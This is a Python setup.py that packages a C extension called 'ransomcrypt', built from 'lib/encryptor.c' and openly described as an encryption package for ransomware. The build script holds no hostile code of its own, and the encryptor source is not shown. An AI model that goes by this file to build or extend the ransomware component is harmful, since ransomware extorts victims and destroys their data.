from distutils.core import setup, Extension

ext_ransomCrypt = Extension('ransomcrypt',
                    sources=['lib/encryptor.c'])

setup(name='ransomcrypt',
      version='1.0',
      description='This is a Encryption Package for a Ransomware',
      ext_modules=[ext_ransomCrypt])
